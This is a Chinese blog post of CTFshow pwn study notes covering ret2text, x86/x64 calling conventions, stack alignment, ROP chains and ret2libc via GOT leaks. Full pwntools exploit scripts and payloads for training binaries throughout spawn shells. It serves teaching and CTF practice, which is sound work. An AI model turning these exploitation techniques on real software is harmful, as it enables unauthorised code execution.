<!DOCTYPE html>
<html lang="zh-CN">
  <head>
    

    
<script>!function(){var e=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches,t=localStorage.getItem("use-color-scheme")||"auto";("dark"===t||e&&"light"!==t)&&document.documentElement.classList.toggle("dark",!0)}()</script>
    

<meta charset="utf-8" >

<title>PWN_CTF</title>
<meta name="keywords" content="PWN_CTF, Kidder1&#39;s Blog!">
<meta name="description" content="Pwn_CTF刷题和知识点记录">
<meta name="apple-mobile-web-app-capable" content="yes">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta property="og:title" content="PWN_CTF">
<meta property="og:description" content="Pwn_CTF刷题和知识点记录">

<link rel="shortcut icon" href="/favicon.ico">
<link rel="stylesheet" href="/style/main.css">

  <link rel="stylesheet" href="/style/simple-lightbox.min.css"><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Kidder1's Blog!" type="application/atom+xml">
</head>
  <body>
    <div id="app" class="main">

<div class="site-header-container">
  <div class="site-header">
    <div class="left">
      <a href="https://kidder1.github.io">
        <img class="avatar" src="/images/avatar.png" alt="logo" width="32px" height="32px">
      </a>
      <a href="https://kidder1.github.io">
        <h1 class="site-title">Kidder1&#39;s Blog!</h1>
      </a>
    </div>
    <div class="right">
        <i class="icon menu-switch icon-menu-outline" ></i>
    </div>
  </div>
</div>

<div class="menu-container" style="height: 0;opacity: 0;">
<nav class="menu-list">
  
    
      <a href="/" class="menu purple-link">
        首页
      </a>
    
  
    
      <a href="/categories" class="menu purple-link">
        分类
      </a>
    
  
    
      <a href="/tags/" class="menu purple-link">
        标签
      </a>
    
  
    
      <a href="/archives" class="menu purple-link">
        归档
      </a>
    
  
    
      <a href="/about" class="menu purple-link">
        关于
      </a>
    
  
</nav>
</div>



  <div class="content-container">
    <div class="post-detail">
      
      <h2 class="post-title">PWN_CTF</h2>
      <div class="post-info post-detail-info">
        <span><i class="icon icon-calendar-outline"></i> 2023-07-24</span>
        
          <span>
          <i class="icon icon-pricetags-outline"></i>
            
              <a href="/tags/Pwn/">
              Pwn
                
              </a>
            
          </span>
        
      </div>
      <div class="post-content-wrapper">
        <div class="post-content">
          <h1 id="CTFSHOW"><a href="#CTFSHOW" class="headerlink" title="CTFSHOW"></a>CTFSHOW</h1><h2 id="pwn37-38-return-text"><a href="#pwn37-38-return-text" class="headerlink" title="pwn37&#x2F;38(return text)"></a>pwn37&#x2F;38(return text)</h2><blockquote>
<p>ret2text (Return-to-text&#x2F;Return-to-code): ret2text 是一种利用栈溢出等漏洞，将程序控制流导向程序本身的代码区域（text&#x2F;code segment）的技术。在许多程序中，代码区域是可执行的，因此攻击者可以通过改变程序执行流程，使其执行恶意的代码。一般情况下，攻击者会在栈上放置一个指向代码区域中恶意代码的地址，然后通过溢出等漏洞改变函数的返回地址，使程序跳转到恶意代码并执行.。 </p>
</blockquote>
<h3 id="查看内存常用命令"><a href="#查看内存常用命令" class="headerlink" title="查看内存常用命令"></a>查看内存常用命令</h3><blockquote>
<p>dq      x&#x2F;10xg       p&#x2F;x    telescope </p>
</blockquote>
<p>GDB测偏移</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725170934385.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725170934385.png"  class="" lazyload></a>

<p>关于栈平衡的问题：如果正常的payload打不通，就在payload前面加一个ret的地址进行栈平衡，让继续执行下一个指令。</p>
<p>gdb调试system成功，rbp下面就是返回地址，可以通过gdb查看是否改写成功。</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725184203864.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725184203864.png"  class="" lazyload></a>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28119</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400657</span></span><br><span class="line">ret = <span class="number">0x40066D</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) +p64(ret)+p64(backdoor)<span class="comment"># 放一个ret平衡栈，在rop链子的前面</span></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn39（没有后门函数）"><a href="#pwn39（没有后门函数）" class="headerlink" title="pwn39（没有后门函数）"></a>pwn39（没有后门函数）</h2><ul>
<li><p>注意点：在32位置中plt后面默认跟的是返回地址，所以函数的plt和参数中间要给返回补充padding</p>
</li>
<li><p>更好的理解：调用一个函数的时候要对应一个返回地址；也就是说，如果在system之后夺得shell的话，那就不需要在添加返回地址了</p>
<blockquote>
<p>32：sys_plt + ret_addr + bin&#x2F;sh 						必须添加</p>
<p>64：pop_rdi + bin&#x2F;sh + system +ret_addr 		可加可不加</p>
</blockquote>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28134</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">binsh_addr = <span class="number">0x08048750</span></span><br><span class="line">system_plt = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;system_addr&#x27;</span>,system_plt)</span><br><span class="line"><span class="comment"># 这里0也可以用ret来代替，补充plt的返回地址</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x12</span>+<span class="number">4</span>)+p32(system_plt)+p32(<span class="number">0</span>)+p32(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p.recvuntil(&#x27;Just easy ret2text&amp;&amp;32bit&#x27;)</span></span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn40（没有后门函数，x64的寄存器传参顺序）"><a href="#pwn40（没有后门函数，x64的寄存器传参顺序）" class="headerlink" title="pwn40（没有后门函数，x64的寄存器传参顺序）"></a>pwn40（没有后门函数，x64的寄存器传参顺序）</h2><p>知识点传参顺序：</p>
<ol>
<li><strong>存器传参（Register Parameter Passing）</strong>：x64架构的计算机使用寄存器来传递一部分参数。通常情况下，前几个参数会被传递到特定的寄存器中，而不是存放在栈上。例如，对于Windows操作系统上的x64架构，前四个整数或指针参数（整数、指针、地址等）会被依次存放在寄存器<code>RCX</code>、<code>RDX</code>、<code>R8</code>和<code>R9</code>中。（还有一种说法：RDI, RSI, RDX, RCX, R8, R9）</li>
<li><strong>栈传参（Stack Parameter Passing）</strong>：如果函数参数的数量超过了寄存器的限制，额外的参数将存储在栈上。参数从右向左依次入栈，即后面的参数先入栈，前面的参数后入栈。在栈上传参时，可能会有对齐要求，保证栈上数据的对齐方式。</li>
<li><strong>返回值传递（Return Value Passing）</strong>：函数的返回值通常通过寄存器<code>RAX</code>来传递。整数和指针类型的返回值通常存储在<code>RAX</code>中，而浮点数返回值通常存储在<code>XMM0</code>寄存器中。</li>
</ol>
<p><strong>工具</strong>：ROPgadget –binary .&#x2F;file_name  –only “pop|ret” | grep reg</p>
<ul>
<li><p>关于如何区分32位和64位的参数payload的编写顺序：想两者函数调用的编写规则，然后给倒过来写即可：</p>
<blockquote>
<p>32：压入参数   压入返回地址   压入函数地址</p>
<p>64：寄存器传参数   压入返回地址   压入函数地址</p>
</blockquote>
</li>
</ul>
<p>栈平衡：在编程中，函数调用的栈平衡指的是在程序执行过程中，确保函数调用和返回的堆栈（通常称为调用栈或执行栈）的平衡</p>
<blockquote>
<p>栈平衡就是给加一个ret的地址作为跳板让其返回到下一个栈地址继续执行，作为一个填充长度，放在rop调用链之前或者调用函数之前，不能放到调用函数之后</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 正确写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(ret)+ p64(pop_rdi) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh)+ p64(ret) + p64(system) </span><br><span class="line"><span class="comment"># 错误写法</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi + p64(ret)) + p64(binsh) + p64(system) </span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>) + p64(pop_rdi) + p64(binsh) + p64(system) + p64(ret)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># exp.py</span></span><br><span class="line">binsh = <span class="number">0x400808</span></span><br><span class="line">system = <span class="number">0x400520</span></span><br><span class="line">pop_rdi = <span class="number">0x4007e3</span></span><br><span class="line">system = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x0A</span> + <span class="number">8</span>)   + p64(ret)+ p64(pop_rdi) + p64(binsh)+p64(system) </span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="pwn41-42-bin-sh使用sh代替"><a href="#pwn41-42-bin-sh使用sh代替" class="headerlink" title="pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)"></a>pwn41&#x2F;42(&#x2F;bin&#x2F;sh使用sh代替)</h2><ol>
<li>system(“&#x2F;bin&#x2F;sh”) ：<br>在Linux和类Unix系统中， &#x2F;bin&#x2F;sh 通常是一个符号链接，指向系统默认的shell程序（如Bash或Shell）。因此，使用system(“&#x2F;bin&#x2F;sh”) 会启动指定的shell程序，并在新的子进程中执行。这种方式可以确保使用系统默认的shell程序执行命令，因为&#x2F;bin&#x2F;sh 链接通常指向<br>默认shell的可执行文件。</li>
<li>system(“sh”) ：<br>使用system(“sh”) 会直接启动一个名为sh 的shell程序，并在新的子进程中执行。这种方式假设系统的环境变量$PATH 已经配置了能够找到sh 可执行文件的路径，否则可能会导致找不到sh 而执行失败。</li>
</ol>
<h2 id="pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）"><a href="#pwn43-44（构造-bin-sh-gdb调试跟踪参数传递流程）" class="headerlink" title="pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）"></a>pwn43&#x2F;44（构造&#x2F;bin&#x2F;sh,gdb调试跟踪参数传递流程）</h2><p>知识点</p>
<ul>
<li>注意bss段的buf可以手动构造bin&#x2F;sh字符串作为参数传入。</li>
</ul>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230728173933897.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230728173933897.png"  class="" lazyload></a>

<ul>
<li>gets函数没有输入的长度限制，可以一直输入直至回车键</li>
<li>如果read这种有输入长度限制但是不够rop链的，可以进行栈迁移</li>
</ul>
<p>注意，这里的一个问题困扰了很久：一个简单的ROP链是可以用GDB进行调试的，那复杂的怎么办呢？</p>
<p>这里和同学进行了请教，然后对wp的看似简单的rop链进行分析，这里需要注意个几个点：</p>
<ol>
<li>每一个函数调用在32位里面都需要跟一个返回地址，这里gets的返回地址是pop_ebx，system的返回地址是aaaa，main函数的返回地址是gets，因为如果你后面rop链要继续调用的话，函数调用为了完整性返回地址、参数必须完整</li>
<li>这段rop链子的调用过程概述：通过返回地址到gets读取参数buf2的参数（通过sendline传送的&#x2F;bin&#x2F;sh）然后通过pop将buf2存入ebx，然后system调用参数buf2中的bin&#x2F;sh从而夺权</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br></pre></td></tr></table></figure>

<ol start="3">
<li><p>完整代码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment"># io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28169)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x804B060</span></span><br><span class="line">gets = elf.sym[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">pop_ebx = <span class="number">0x8048409</span> <span class="comment"># 0x08048409 : pop ebx ; ret</span></span><br><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(pop_ebx) + p32(buf2) + p32(system) + <span class="string">b&#x27;aaaa&#x27;</span> + p32(buf2)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">io.recv()</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 64位</span></span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">gets = elf.symbols[<span class="string">&#x27;gets&#x27;</span>]</span><br><span class="line">buf2 = <span class="number">0x602080</span></span><br><span class="line">pop_rdi = <span class="number">0x4007f3</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">ret = <span class="number">0x4004fe</span> <span class="comment"># 0x00000000004004fe : ret</span></span><br><span class="line"><span class="comment"># ret栈对齐是0x10 加单数个理论上</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xA</span>+<span class="number">8</span>)  + p64(pop_rdi) + p64(buf2) + p64(gets) + p64(pop_rdi) + p64(buf2) + p64(system) </span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>


</li>
<li><p>gdb的调试过程：通过查看内存变量观察函数的调用过程    通过观察主函数的返回地址观察函数调用过程</p>
<ol>
<li><p>先通过finish运行到主函数内部进行查看</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224725259.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224725259.png"  class="" lazyload></a>
</li>
<li><p>然后发现主函数返回到gets函数</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731224947918.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731224947918.png"  class="" lazyload></a>
</li>
<li><p>查看gets的系统调用执行</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225224295.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225224295.png"  class="" lazyload></a>
</li>
<li><p>通过finish查看gets的返回地址是pop ebx 然后ret到system执行，在这里只是pop  ebx只是作为一个跳板，只是为了返回到system地址进行getshell而已</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225354257.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225354257.png"  class="" lazyload></a>
</li>
<li><p>发现一致</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731225807535.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731225807535.png"  class="" lazyload></a>
</li>
<li><p>这里还有一个简单的思路：通过覆盖gets的返回地址为system，然后让system的返回地址为buf2同时作为gets的参数也可以getshell，这个原理就是每个函数调用的参数返回地址等，与其他函数的调用无关。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = cyclic(<span class="number">0x6c</span>+<span class="number">4</span>) + p32(gets) + p32(system) + p32(buf2)+ p32(buf2)</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
</ol>
<h2 id="pwn45-46-got表泄露-ret2libc"><a href="#pwn45-46-got表泄露-ret2libc" class="headerlink" title="pwn45&#x2F;46(got表泄露) ret2libc"></a>pwn45&#x2F;46(got表泄露) ret2libc</h2><blockquote>
<p> 特征：没有system  没有bin&#x2F;sh</p>
<p>那么如何得到 libc 中的某个函数的地址呢？我们一般常用的方法是采用 got 表泄露，即输出某个函数对应的 got 表项的内容。当然，由于 libc 的延迟绑定机制，我们需要泄漏已经执行过的函数的地址。这里注意要对泄露的函数原型进行查看，对payload要完成传参。</p>
<p>在得到 libc 之后，其实 libc 中也是有 &#x2F;bin&#x2F;sh 字符串的，所以我们可以一起获得 &#x2F;bin&#x2F;sh 字符串的地址。</p>
</blockquote>
<h4 id="puts泄露"><a href="#puts泄露" class="headerlink" title="puts泄露"></a>puts泄露</h4><p>这里注意接收的形式：直到xf7取从最后到倒数接收四个字节就是地址（这里后面没有0所以要截断四个字节，倒着接收是因为小段序）<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731145442576.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731145442576.png"  class="" lazyload></a></p>
<p>查询libc偏移和版本的网站：<a target="_blank" rel="noopener" href="https://libc.blukat.me/">libc database search (blukat.me)</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 32位</span></span><br><span class="line">puts_plt = elf.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">write_plt = elf.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main_plt = elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">ret = <span class="number">0x08048356</span></span><br><span class="line">lg(<span class="string">&#x27;puts plt&#x27;</span>, puts_plt)</span><br><span class="line">lg(<span class="string">&#x27;write plt&#x27;</span>, write_plt)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过打印获得puts的地址</span></span><br><span class="line"><span class="comment"># read 0xC8</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>)  </span><br><span class="line"><span class="comment"># 这里的返回地址写成main函数可以让这个payload执行完毕之后，再一次进行溢出</span></span><br><span class="line">payload += p32(puts_plt) + p32(main_plt) + p32(puts_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="comment"># 因为小端序 倒取四个字节</span></span><br><span class="line">puts_addr = u32(p.recvuntil(<span class="string">&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:])</span><br><span class="line">lg(<span class="string">&#x27;puts_addr&#x27;</span>, puts_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 通过puts的地址获取libc的地址</span></span><br><span class="line"><span class="comment"># puts_addr = 0xf7d6b360</span></span><br><span class="line">libc_base = puts_addr - <span class="number">0x067360</span></span><br><span class="line">system_plt = libc_base + <span class="number">0x03cd10</span></span><br><span class="line">binsh =  libc_base + <span class="number">0x17b8cf</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x6b</span> + <span class="number">4</span>) </span><br><span class="line">payload += p32(system_plt) + p32(<span class="number">0</span>) + p32(binsh)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;O.o?&#x27;</span>)</span><br><span class="line">dbg()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这里的接收的&#x2F;x7f，因为libc的地址是六位，前两位是00不显示。又因为接收的的字节，所以用u64解包，并且高位用00补全八位</p>
<blockquote>
<p>0x 7f ff f7 e1 50 00<br>puts_addr &#x3D; p.recvuntil(‘\x7f’)[-6:].ljust(8,’\x00’）</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173353357.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173353357.png"  class="" lazyload></a>
<p>puts_addr &#x3D; u64(p.recvuntil(‘\x7f’)[-6:].ljust(8,b’\x00’))</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731173459832.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731173459832.png"  class="" lazyload></a>
</blockquote>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230731172534065.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230731172534065.png"  class="" lazyload></a>

<h4 id="write泄露"><a href="#write泄露" class="headerlink" title="write泄露"></a>write泄露</h4><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801164558925.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801164558925.png"  class="" lazyload></a>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x70</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15) + p64(write_got) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(write_plt)</span><br><span class="line">payload += p64(main)</span><br></pre></td></tr></table></figure>

<p><strong>注意：</strong>这里有一个注意的点，p64(pop_rsi_r15)这个点，对于write这个函数的参数只有三个参数：</p>
<ul>
<li>fd：文件描述符，这里就是1</li>
<li>buf：需要传入的字符串</li>
<li>count：每次写入的字节数</li>
</ul>
<p>但是看看gadget，只能控制rdi和rsi，r15不能控制，这种情况一般是没有用的padding给填充位置，或者没办法控制。</p>
<a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230801211525162.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230801211525162.png"  class="" lazyload></a>

<h2 id="pwn47-48（ret2libc-LibcSeacher）"><a href="#pwn47-48（ret2libc-LibcSeacher）" class="headerlink" title="pwn47&#x2F;48（ret2libc - LibcSeacher）"></a>pwn47&#x2F;48（ret2libc - LibcSeacher）</h2><h3 id="四个libc目录区别"><a href="#四个libc目录区别" class="headerlink" title="四个libc目录区别"></a>四个libc目录区别</h3><blockquote>
<p>在Linux系统中，这四个目录(lib, lib32, lib64, libx32)是用来存放共享库文件的目录，它们之间有一些区别，具体如下：</p>
<ol>
<li>lib目录：这是存放32位架构的共享库的目录。在早期的32位系统中使用，现在仍然保留为了向后兼容性。通常位于<code>/usr/lib</code>或者<code>/lib</code>目录下。</li>
